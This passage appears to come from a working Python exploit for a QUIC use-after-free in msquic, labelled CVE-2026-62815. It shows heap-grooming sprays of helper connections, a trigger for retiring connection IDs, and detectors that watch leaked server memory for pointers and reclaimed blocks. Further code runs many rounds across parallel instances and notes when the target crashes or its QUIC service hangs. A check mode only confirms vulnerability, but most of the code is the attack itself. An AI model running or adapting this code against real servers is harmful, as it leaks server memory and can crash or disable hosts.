            dbg(f'   [fengshui] {n} Qc0D mints across {len(pool)} co-partition helpers')
        else:
            dbg('   [fengshui] skipped (no co-partition helpers)')

    findings = []
    seen_new = set()
    helper_cids = {}
    server_cids = {}
    server_cids.update(poison.peer_cid_table())
    g_cands = []
    leak_confirmed = [False]
    reclaim_now = [False]
    retired_reuse = [False]
    reuse_seen = {}

    def cid_labels():
        d = dict(server_cids)
        d.update(known)
        return d

    def on_datagram(ts, sport, d):
        # phase h: structural reclaim detector (length or foreign CID).
        if PHASE == 'h' and d and not (d[0] & 0x80):
            for _c in poison.c._host_cids:
                known.setdefault(_c.cid, f'r{rid}-hostcid-seq{_c.sequence_number}')
            _dc = d[1:1 + PCIDLEN]
            if len(d) > RECLAIM_LEN_HINT:
                reclaim_now[0] = True
            elif (len(_dc) == PCIDLEN and _dc not in known
                    and _dc not in zombie and _dc not in gknown):
                reclaim_now[0] = True
        rec = classify_g_leak(d, server_cids, cid_labels())
        if rec is not None:
            g_cands.append((ts, sport, d, rec))
            if rec.get('own_cid_match') or rec.get('adj_cid_match'):
                leak_confirmed[0] = True
            return
        kind, dcid, rest = parse_first_packet(d, PCIDLEN)
        if kind != 'short' or len(dcid) != PCIDLEN:
            return
        # Retired-CID reuse: a host CID we explicitly retired (seq < kill seq).
        # One or two packets right after the kill are the benign in-flight
        # drain race every conforming QUIC stack shows; the UAF keeps
        # transmitting on the retired CID, so require RETIRE_REUSE_MIN packets.
        if dcid in known:
            s = cid_seq.get(dcid, -1)
            if 0 <= s < seq:
                n = reuse_seen.get(dcid, 0) + 1
                reuse_seen[dcid] = n
                if n == RETIRE_REUSE_MIN:
                    retired_reuse[0] = True
                    rec = {'round': rid, 'ts': round(ts, 3), 'sport': sport,
                           'dcid8': dcid.hex(), 'class': 'RETIRED-CID-REUSE',
                           'cid_seq': s, 'pkts': n}
                    findings.append(rec)
                    seen_new.add(dcid)
                    print(f'   !! RETIRED CID REUSED by server: seq{s} '
                          f'{dcid.hex()} (x{n} pkts)', flush=True)
                    log.write(json.dumps(rec) + '\n'); log.flush()
            return
        if dcid in zombie or dcid in seen_new:
            return
        if dcid in helper_cids:
            seen_new.add(dcid)
            rec = {'round': rid, 'ts': round(ts, 3), 'sport': sport,
                   'dcid8': dcid.hex(), 'class': 'RECLAIM-MARKER',
                   'who': helper_cids[dcid]}
            findings.append(rec)
            dbg(f'   *** RECLAIM: poisoned conn now speaks helper CID '
                f'{dcid.hex()} ({helper_cids[dcid]}) ***')
            log.write(json.dumps(rec) + '\n'); log.flush()
            return
        seen_new.add(dcid)
        rec = {'round': rid, 'ts': round(ts, 3), 'sport': sport,
               'dcid8': dcid.hex(), 'dump': d[:160].hex()}
        (u,) = struct.unpack_from('<Q', dcid, 0)
        ptrs = scan_ptrs(rest[:150])
        rec['class'] = 'FOREIGN-SEQ-LIKE' if u < 64 else 'FOREIGN'
        if dcid in gknown:
            rec['class'] = 'CROSS-ROUND-CID'
        if ptrs:
            rec['ptrs'] = [[hex(o), hex(q)] for o, q in ptrs[:8]]
        findings.append(rec)
        dbg(f'   !! {rec["class"]} dcid8={dcid.hex()} ptrs={rec.get("ptrs")}')
        log.write(json.dumps(rec) + '\n')
        log.flush()

    # baseline: what DCIDs does the server use right after the kill?
    collect([poison], 1.2, on_datagram)
    base = {}
    for ts, sport, d in poison.cap:
        kind, dcid, _ = parse_first_packet(d, PCIDLEN)
        if kind == 'short':
            base.setdefault(dcid, 0)
            base[dcid] += 1
    dbg('   server DCIDs seen so far (incl. pre-kill):')
    for dcid, n in base.items():
        tag = known.get(dcid) or ('zombie' if dcid in zombie else '*** FOREIGN ***')
        dbg(f'     {dcid.hex()}  x{n}  {tag}')

    # --- groom: SourceCid-mint spray -----------------------------------------
    # Helpers use 8-byte client CIDs so their own server-side DestCid alloc
    # (req 0x38 -> 0x50 chunk) stays OUT of the 0x60 bucket; every SourceCid
    # mint (req 0x4C -> 0x50 body -> 0x60 chunk, 'Qc0D') during a helper
    # handshake is a candidate pop of the freed block on that helper's worker.
    helpers = []
    alive = [h for h in steered if not h.dead]
    if len(alive) < len(steered):
        dbg(f'   [part] {len(steered) - len(alive)} steered helper(s) died before wave 0')
    steered = alive
    if steered:
        helpers.extend(steered)
        dbg(f'   [g] wave 0 = {len(steered)} PARTITION-STEERED helpers')
    else:
        for i in range(WHELPERS):
            helpers.append(Endpoint(cid_len=8, label=f'r{rid}-g0-{i}'))

    wave_no = [1]
    wave_ts = [time.time()]
    def spawn_wave(eps):
        if wave_no[0] >= GWAVES:
            return
        t = time.time()
        if t - wave_ts[0] < WAVE_GAP:
            return
        wave_ts[0] = t
        for i in range(WHELPERS):
            h = Endpoint(cid_len=8, label=f'r{rid}-g{wave_no[0]}-{i}')
            try:
                h.sock()
                h.c.connect((HOST, PORT), now=h.now())
            except Exception:
                h.dead = True
            helpers.append(h)
            eps.append(h)
        wave_no[0] += 1
        dbg(f'   [g] spawned wave {wave_no[0]-1} ({WHELPERS} x 8-byte-CID helpers)')

    for h in helpers:
        ok = h.handshake(timeout=3.0)
        if ok:
            helper_cids.update(h.host_cid_table())
            server_cids.update(h.peer_cid_table())
        dbg(f'   helper {h.label} handshake={"ok" if ok else "FAIL"}')

    def flood_ioload():
        for h in ioload:
            if h.dead:
                continue
            h.ping(IOLOAD_PINGS)
            for sk in h.socks:
                h.flush(sk)

    def sync_helpers():
        for h in helpers:
            if not h.dead:
                helper_cids.update(h.host_cid_table())
                server_cids.update(h.peer_cid_table())
        server_cids.update(poison.peer_cid_table())
        if ioload:
            flood_ioload()

    fired = [0]
    def sync_feedback():
        sync_helpers()
        if (reclaim_now[0] or leak_confirmed[0]) and not fired[0]:
            seq = fire_retire_trigger(poison, rid, log)
            fired[0] = 1
            dbg(f'   [h] RECLAIM SEEN -> retire fired immediately '
                f'(NCID seq={seq})')

    collect([poison] + helpers + ioload, COLLECT_SECS, on_datagram,
            sync=sync_feedback,
            wave=spawn_wave,
            stop_when=(lambda: retired_reuse[0]) if CHECK else None)

    if not CHECK:
        write_probe(poison, rid, log, bool(leak_confirmed[0]))

    # summary of all short-header DCIDs seen on the poisoned connection
    seen = {}
    for ts, sport, d in poison.cap:
        kind, dcid, _ = parse_first_packet(d, PCIDLEN)
        if kind == 'short':
            seen.setdefault(dcid, 0)
            seen[dcid] += 1
    dbg('   === round summary: poisoned-conn server DCIDs ===')
    for dcid, n in seen.items():
        tag = known.get(dcid, '')
        marker = ''
        if not tag:
            if dcid in zombie:
                tag = 'zombie(pre-kill)'
            elif dcid in gknown:
                tag = 'cross-round CID'
            else:
                if len(dcid) >= 8:
                    (u,) = struct.unpack_from('<Q', dcid, 0)
                    tag = 'FOREIGN-SEQ-LIKE' if u < 64 else 'FOREIGN'
                else:
                    tag = 'FOREIGN-short'
                marker = '  <<<'
        dbg(f'     {dcid.hex()}  x{n}  {tag}{marker}')

    gknown.update(known)
    server_cids.update(poison.peer_cid_table())
    for h in helpers:
        server_cids.update(h.peer_cid_table())
    gl = []
    for ts, sport, d, rec0 in g_cands:
        rec = classify_g_leak(d, server_cids, cid_labels())
        if not rec:
            continue
        byd = set(rec.get('beyond_dcid') or ())
        tag_hit = any(rec.get(k) in MSQUIC_POOL_TAGS
                      for k, _ in TAG_OFFSETS if k not in byd)
        rec['cid_tag_hit'] = any(rec.get(k) in QUIC_CID_TAGS
                                 for k, _ in TAG_OFFSETS if k not in byd)
        if not (rec.get('own_cid_match') or rec.get('adj_cid_match') or
                tag_hit or
                any(rec.get(k) for k, _ in ALL_PTRS if k not in byd)):
            continue
        neigh = (rec.get('adj_tag'), rec.get('adj2_tag'),
                 tuple(rec.get(k) for k, _ in ALL_PTRS),
                 rec.get('adj_cid_hex'), rec['dgram_len'])
        key = (rec['seq'], rec.get('own_cid_hex'), neigh)
        if key in seen_new:
            continue
        seen_new.add(key)
        rec.update({'round': rid, 'ts': round(ts, 3), 'sport': sport,
                    'class': 'G-LEAK'})
        gl.append(rec)
        findings.append(rec)
        leak_confirmed[0] = True
        byd = set(rec.get('beyond_dcid') or ())
        hb = set(rec.get('infer_hint_beyond') or ())
        kp = ' '.join(f'{k}={rec[k]}'
                      + ('?' if k in byd else '~' if k in hb else '')
                      for k, _ in ALL_PTRS if rec.get(k))
        tg = ' '.join(f'{k}={rec[k]!r}'
                      + ('?' if k in byd else
                         '~' if k in hb else
                         '<<<' if rec.get(k) in QUIC_CID_TAGS else
                         '<<' if rec.get(k) in MSQUIC_POOL_TAGS else '')
                      for k, _ in TAG_OFFSETS if rec.get(k))
        print(f'   *** G-LEAK seq={rec["seq"]} dgram_len={rec["dgram_len"]} '
              f'own_cid={rec.get("own_cid_match") or rec.get("own_cid_hex")} '
              f'kptrs=[{kp or "none"}] '
              f'tags=[{tg or "none"}] '
              f'adj_len={rec.get("adj_len")} '
              f'adj_cid={rec.get("adj_cid_match") or rec.get("adj_cid_hex")}')
        log.write(json.dumps(rec) + '\n')
        log.flush()
    if gl:
        print(f'   === {len(gl)} unique SourceCid-reclaim leaks ===')
    else:
        dbg(f'   no leak this round ({len(g_cands)} candidates)')

    for h in helpers:
        h.close(graceful=True)
    for h in ioload:
        h.close()
    poison.close()
    return findings

BANNER = (
    '# ==============================================================\n'
    '#   CVE-2026-62815: QUIC UaF\n'
    '#   @w3bd3vil  https://krashconsulting.com\n'
    '# ==============================================================\n'
    )


def preflight():
    """Parent-only preflight (borrowed from fingerprint.py): confirm the target
    speaks QUIC and looks like native msquic before spending 48 rounds x N
    instances on it.

    - handshake times out            -> unreachable, exit 2
    - server CID is not the 9-byte    -> unsupported, exit 2
    """
    cfg = QuicConfiguration(is_client=True, alpn_protocols=[ALPN],
                            verify_mode=ssl.CERT_NONE, idle_timeout=30.0,
                            connection_id_length=8)
    cfg.server_name = SNI
    c = QuicConnection(configuration=cfg)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.4)
    s.bind(('0.0.0.0', 0))
    t0 = time.time()
    c.connect((HOST, PORT), now=0.0)
    end = time.time() + 8
    while time.time() < end and not c._handshake_complete:
        for d, a in c.datagrams_to_send(now=time.time() - t0):
            try:
                s.sendto(d, a)
            except Exception:
                pass
        try:
            d, src = s.recvfrom(4096)
            c.receive_datagram(d, src, now=time.time() - t0)
        except socket.timeout:
            pass
        except Exception:
            break
        ev = c.next_event()
        while ev is not None:
            ev = c.next_event()
    try:
        s.close()
    except Exception:
        pass

    if not c._handshake_complete:
        print(f'Error: unreachable {HOST} on QUIC')
        sys.exit(2)

    cur = getattr(c, '_peer_cid', None)
    cid = cur.cid if cur else b''
    if len(cid) != 9:
        print(f'Unsupported target, abort!')
        sys.exit(2)
    dbg(f'preflight ok: reachable')


def main():
    mode = 'check' if CHECK else ('leak' if LEAK else '48-round')
    dbg(f'=== CVE-2026-62815 phase={PHASE} -> {HOST}:{PORT} SNI={SNI} ALPN={ALPN} '
        f'rounds={ROUNDS} helpers={NHELPERS} gwaves={GWAVES} '
        f'instances={INSTANCES} mode={mode} ===')
    if DEBUG:
        dbg(f'pre-flight target_alive={host_alive()}')
    os.makedirs('leakcap', exist_ok=True)
    _safe = ''.join(c if c.isalnum() or c in '.-' else '_' for c in str(HOST))
    log = open(f'leakcap/{_safe}_{int(time.time())}_{os.getpid()}.jsonl', 'w')
    gknown = {}
    confirmed = False
    down_streak = 0
    for r in range(1, ROUNDS + 1):
        dbg(f'--- round {r}/{ROUNDS} ---')
        found = None
        try:
            found = run_round(r, log, gknown)
        except Exception as e:
            print(f'   [err {type(e).__name__}: {e}]')
            found = []
        if found is None:
            down_streak += 1
            dbg(f'   handshake FAILED (target down? streak={down_streak})')
            if down_streak >= 3:
                if host_alive():
                    print('\n*** TARGET UP but QUIC listener wedged (service DoS) ***')
                else:
                    print('\n*** TARGET DOWN (bugcheck / reboot) ***')
                break
        else:
            down_streak = 0
            if CHECK:
                if any(f.get('class') == 'RETIRED-CID-REUSE' for f in found):
                    confirmed = True
                    break
            elif any(f.get('class') == 'G-LEAK' for f in found):
                confirmed = True
                if LEAK:
                    break
        time.sleep(0.7)
    log.close()
    if CHECK:
        verdict = ('VULNERABLE: RETIRED-CID-REUSE observed'
                   if confirmed else 'not vulnerable: no RETIRED-CID-REUSE')
    else:
        verdict = ('VULNERABLE: G-LEAK observed'
                   if confirmed else f'not vulnerable after {ROUNDS} rounds')
    print(f'=== {verdict} ===')
    sys.exit(0 if confirmed else 1)


def fan_out(n):
    """Launch n independent copies of this engine as subprocesses, streaming
    output with an [iK] prefix.  Each child runs INSTANCES=1 (no recursion).
    Exit 0 if ANY child exits 0 (a leak / success).  In -c mode, terminate the
    siblings as soon as one child confirms RETIRED-CID-REUSE (exit 0)."""
    def pump(idx, proc):
        for line in proc.stdout:
            sys.stdout.write(f'[i{idx}] {line}')
            sys.stdout.flush()

    env = dict(os.environ, INSTANCES='1', _FANOUT_CHILD='1')
    procs = []
    threads = []
    for k in range(n):
        if k:
            time.sleep(INSTANCE_GAP)
        p = subprocess.Popen([sys.executable, '-u'] + sys.argv,
                             env=env,
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True)
        procs.append(p)
        t = threading.Thread(target=pump, args=(k, p), daemon=True)
        t.start()
        threads.append(t)
        dbg(f'=== launched instance {k} ({INSTANCE_GAP}s gap) ===')

    try:
        if CHECK:
            codes = []
            remaining = list(procs)
            while remaining:
                for p in remaining[:]:
                    rc = p.poll()
                    if rc is not None:
                        codes.append(rc)
                        remaining.remove(p)
                        if rc == 0:
                            for q in remaining:
                                q.terminate()
                                codes.append(q.wait())
                            remaining = []
                            break
                if remaining:
                    time.sleep(0.05)
        else:
            codes = [p.wait() for p in procs]
    except KeyboardInterrupt:
        for p in procs:
            p.terminate()
        codes = [p.wait() for p in procs]
    for t in threads:
        t.join(timeout=2)
    ok = sum(1 for c in codes if c == 0)
    print(f'\n=== {n} instances done; {ok} exited 0 (leak/success) ===')
    sys.exit(0 if ok else 1)


if __name__ == '__main__':
    # Children are spawned with _FANOUT_CHILD=1 and skip this.
    if os.environ.get('_FANOUT_CHILD') != '1':
        print(BANNER, flush=True)
        preflight()
    if INSTANCES == 1:
        main()
    elif CHECK:
        fan_out(4)
    else:
        fan_out(INSTANCES)
